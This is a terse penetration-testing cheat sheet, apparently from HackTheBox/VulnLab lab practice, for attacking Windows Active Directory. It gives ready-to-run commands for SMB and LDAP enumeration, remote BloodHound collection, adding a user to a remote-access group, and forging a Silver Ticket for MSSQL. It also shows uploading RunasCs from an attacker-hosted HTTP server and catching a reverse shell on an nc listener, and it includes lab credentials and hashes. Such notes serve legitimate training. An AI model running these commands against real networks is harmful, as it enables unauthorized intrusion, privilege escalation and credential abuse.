if creds are valid over smb, but not winrm/rdp, try enum4linux with them:
```
enum4linux -a -u "fmcsorley" -p "CrabSharkJellyfish192" 192.168.199.122
```

```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.78.4
```

run bloodhound remotely
```
bloodhound-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```

want to move laterally and have low level (like svc) creds, but that user is not in Remote Users group (so cant execute commands remotely ie get winrm shell):
- host RunAsCs.exe on python server to upload:
	- `python -m http.server 80`
- set up listener:
	- `rlwrap -cAr nc -lvnp 6969`
- upload RunAsCs.exe to svc level shell:
	- `powershell -c wget 10.10.14.172/RunasCs.exe -outfile r.exe`
- run RunasCs.exe:
```
.\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.172:6969 cmd
```
- should create new shell in listener as c.bum
	- c.bum:Tikkycoll_431012284 are creds
	- 10.10.14.172 is tun0 on local machine

if creds are valid, but nxc doesn't show pwned for winrm, run ldeep:
```
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
```
- adds user to remote access group, so evil-winrm should work afterward

***Silver Ticket***
have low level creds, check for SID(from `enum4linux` or `lookupsid.py`) and ServicePrincipalName (from `GetUserSPNs.py`) of user to make silver ticket
```
GetUserSPNs.py breach.vl/julia.wong:Computer1 -dc-ip 10.10.10.111 -request
```
- returns ntlmv2 hash (crack with `john`) and ServicePrincipalName like `MSSQLSVC/BREACH.VL:1433` used in `ticketer.py` command below:
```
lookupsid.py breach.vl/julia.wong:computer1@10.10.10.10
```
- copy Domain SID for `ticketer.py` command below
- get nthash from ntlm hash generator from password from https://codebeautify.org/ntlm-hash-generator
	- Trustno1 = 69596C7AA1E8DAEE17F8E78870E25A5C
- - make sure `/etc/hosts` reflects IP for Domain `BREACH.VL`
```
ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C
-domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl spn 'MSSQLSVC/BREACH.VL:1433@BREACH.VL' -user-id 500 Administrator
```
- will output "saving ticket in Administrator.ccache"
```
export KRB5CCNAME=/home/kali/Desktop/VulnLab/ldap/Administrator.ccache
```
- caches creds
```
mssqlclient.py breach.vl -k -no-pass -windows-auth
```
